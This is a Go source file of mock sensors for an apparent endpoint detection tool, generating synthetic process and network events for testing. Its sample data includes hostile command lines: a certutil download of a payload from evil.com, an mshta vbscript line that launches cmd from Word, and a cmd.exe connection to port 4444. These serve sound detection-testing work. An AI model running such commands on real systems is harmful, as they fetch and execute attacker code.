// Package mock provides synthetic event generators for testing and development.
// Mock sensors produce realistic-looking events without requiring elevated
// privileges or platform-specific APIs.
package mock

import (
	"context"
	"fmt"
	"log/slog"
	"math/rand"
	"os"
	"runtime"
	"sync/atomic"
	"time"

	"github.com/thrive-spectrexq/r3trive/internal/detection/sensor"
	"github.com/thrive-spectrexq/r3trive/pkg/event"
)

// processSensor generates synthetic process creation/exit events.
type processSensor struct {
	eventsCollected atomic.Int64
	errorCount      atomic.Int64
	lastEventTime   atomic.Value
}

// NewProcessSensor creates a new mock process sensor.
func NewProcessSensor() sensor.Sensor {
	return &processSensor{}
}

func (s *processSensor) Name() string { return "MockProcessSensor" }

func (s *processSensor) Platform() []sensor.Platform {
	return []sensor.Platform{sensor.PlatformLinux, sensor.PlatformWindows, sensor.PlatformMacOS}
}

func (s *processSensor) Start(ctx context.Context, ch chan<- event.Event) error {
	slog.Info("mock process sensor started")

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			slog.Info("mock process sensor stopping")
			return nil
		case <-ticker.C:
			evt := s.generateEvent()
			select {
			case ch <- evt:
				s.eventsCollected.Add(1)
				s.lastEventTime.Store(evt.Timestamp.Format(time.RFC3339))
			case <-ctx.Done():
				return nil
			}
		}
	}
}

func (s *processSensor) Stop() error {
	return nil
}

func (s *processSensor) Health() sensor.SensorHealth {
	lastTime, _ := s.lastEventTime.Load().(string)
	return sensor.SensorHealth{
		Healthy:         true,
		Status:          "running (mock)",
		EventsCollected: s.eventsCollected.Load(),
		LastEventTime:   lastTime,
		ErrorCount:      s.errorCount.Load(),
	}
}

func (s *processSensor) generateEvent() event.Event {
	proc := mockProcesses[rand.Intn(len(mockProcesses))]
	hostname, _ := os.Hostname()

	return event.Event{
		ID:        fmt.Sprintf("evt_%d", time.Now().UnixNano()),
		Timestamp: time.Now().UTC(),
		Host: event.HostInfo{
			ID:        "local",
			Hostname:  hostname,
			OS:        runtime.GOOS,
			OSVersion: "mock",
			Arch:      runtime.GOARCH,
		},
		Type:     event.ProcessCreate,
		Severity: proc.severity,
		Sensor:   "MockProcessSensor",
		Data: event.EventData{
			Process: &event.ProcessData{
				PID:     rand.Intn(65535) + 100,
				PPID:    proc.ppid,
				Name:    proc.name,
				Path:    proc.path,
				CmdLine: proc.cmdline,
				User:    proc.user,
				Parent: &event.ParentProcess{
					PID:  proc.ppid,
					Name: proc.parentName,
					Path: proc.parentPath,
				},
			},
		},
	}
}

type mockProcess struct {
	name       string
	path       string
	cmdline    string
	user       string
	ppid       int
	parentName string
	parentPath string
	severity   event.Severity
}

var mockProcesses = []mockProcess{
	{
		name: "chrome.exe", path: `C:\Program Files\Google\Chrome\Application\chrome.exe`,
		cmdline: `chrome.exe --type=renderer`, user: "user",
		ppid: 1000, parentName: "explorer.exe", parentPath: `C:\Windows\explorer.exe`,
		severity: event.SeverityLow,
	},
	{
		name: "powershell.exe", path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		cmdline: `powershell.exe -NoProfile -ExecutionPolicy Bypass`, user: "admin",
		ppid: 5000, parentName: "cmd.exe", parentPath: `C:\Windows\System32\cmd.exe`,
		severity: event.SeverityMedium,
	},
	{
		name: "svchost.exe", path: `C:\Windows\System32\svchost.exe`,
		cmdline: `svchost.exe -k netsvcs -p`, user: "SYSTEM",
		ppid: 800, parentName: "services.exe", parentPath: `C:\Windows\System32\services.exe`,
		severity: event.SeverityLow,
	},
	{
		name: "cmd.exe", path: `C:\Windows\System32\cmd.exe`,
		cmdline: `cmd.exe /c whoami /all`, user: "user",
		ppid: 3200, parentName: "powershell.exe", parentPath: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		severity: event.SeverityMedium,
	},
	{
		name: "certutil.exe", path: `C:\Windows\System32\certutil.exe`,
		cmdline: `certutil.exe -urlcache -split -f http://evil.com/payload.exe`, user: "admin",
		ppid: 4100, parentName: "cmd.exe", parentPath: `C:\Windows\System32\cmd.exe`,
		severity: event.SeverityHigh,
	},
	{
		name: "notepad.exe", path: `C:\Windows\System32\notepad.exe`,
		cmdline: `notepad.exe C:\Users\user\document.txt`, user: "user",
		ppid: 1000, parentName: "explorer.exe", parentPath: `C:\Windows\explorer.exe`,
		severity: event.SeverityLow,
	},
	{
		name: "mshta.exe", path: `C:\Windows\System32\mshta.exe`,
		cmdline: `mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd""")`, user: "user",
		ppid: 2200, parentName: "winword.exe", parentPath: `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`,
		severity: event.SeverityCritical,
	},
	{
		name: "code.exe", path: `C:\Users\user\AppData\Local\Programs\Microsoft VS Code\Code.exe`,
		cmdline: `code.exe --new-window`, user: "user",
		ppid: 1000, parentName: "explorer.exe", parentPath: `C:\Windows\explorer.exe`,
		severity: event.SeverityLow,
	},
}

// networkSensor generates synthetic network events.
type networkSensor struct {
	eventsCollected atomic.Int64
	errorCount      atomic.Int64
	lastEventTime   atomic.Value
}

// NewNetworkSensor creates a new mock network sensor.
func NewNetworkSensor() sensor.Sensor {
	return &networkSensor{}
}

func (s *networkSensor) Name() string { return "MockNetworkSensor" }

func (s *networkSensor) Platform() []sensor.Platform {
	return []sensor.Platform{sensor.PlatformLinux, sensor.PlatformWindows, sensor.PlatformMacOS}
}

func (s *networkSensor) Start(ctx context.Context, ch chan<- event.Event) error {
	slog.Info("mock network sensor started")

	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			slog.Info("mock network sensor stopping")
			return nil
		case <-ticker.C:
			evt := s.generateEvent()
			select {
			case ch <- evt:
				s.eventsCollected.Add(1)
				s.lastEventTime.Store(evt.Timestamp.Format(time.RFC3339))
			case <-ctx.Done():
				return nil
			}
		}
	}
}

func (s *networkSensor) Stop() error {
	return nil
}

func (s *networkSensor) Health() sensor.SensorHealth {
	lastTime, _ := s.lastEventTime.Load().(string)
	return sensor.SensorHealth{
		Healthy:         true,
		Status:          "running (mock)",
		EventsCollected: s.eventsCollected.Load(),
		LastEventTime:   lastTime,
		ErrorCount:      s.errorCount.Load(),
	}
}

func (s *networkSensor) generateEvent() event.Event {
	conn := mockConnections[rand.Intn(len(mockConnections))]
	hostname, _ := os.Hostname()

	return event.Event{
		ID:        fmt.Sprintf("evt_%d", time.Now().UnixNano()),
		Timestamp: time.Now().UTC(),
		Host: event.HostInfo{
			ID:        "local",
			Hostname:  hostname,
			OS:        runtime.GOOS,
			OSVersion: "mock",
			Arch:      runtime.GOARCH,
		},
		Type:     event.NetworkConnect,
		Severity: conn.severity,
		Sensor:   "MockNetworkSensor",
		Data: event.EventData{
			Network: &event.NetworkData{
				Protocol:    conn.protocol,
				SrcIP:       "192.168.1.100",
				SrcPort:     rand.Intn(64000) + 1024,
				DstIP:       conn.dstIP,
				DstPort:     conn.dstPort,
				ProcessName: conn.processName,
				ProcessPID:  rand.Intn(65535) + 100,
			},
		},
	}
}

type mockConnection struct {
	protocol    string
	dstIP       string
	dstPort     int
	processName string
	severity    event.Severity
}

var mockConnections = []mockConnection{
	{protocol: "TCP", dstIP: "142.250.80.46", dstPort: 443, processName: "chrome.exe", severity: event.SeverityLow},
	{protocol: "TCP", dstIP: "13.107.42.14", dstPort: 443, processName: "code.exe", severity: event.SeverityLow},
	{protocol: "TCP", dstIP: "185.220.101.47", dstPort: 443, processName: "svchost.exe", severity: event.SeverityHigh},
	{protocol: "UDP", dstIP: "8.8.8.8", dstPort: 53, processName: "dns.exe", severity: event.SeverityLow},
	{protocol: "TCP", dstIP: "104.16.132.229", dstPort: 443, processName: "discord.exe", severity: event.SeverityLow},
	{protocol: "TCP", dstIP: "45.33.32.156", dstPort: 4444, processName: "cmd.exe", severity: event.SeverityCritical},
	{protocol: "TCP", dstIP: "20.54.37.64", dstPort: 443, processName: "ms-teams.exe", severity: event.SeverityLow},
}
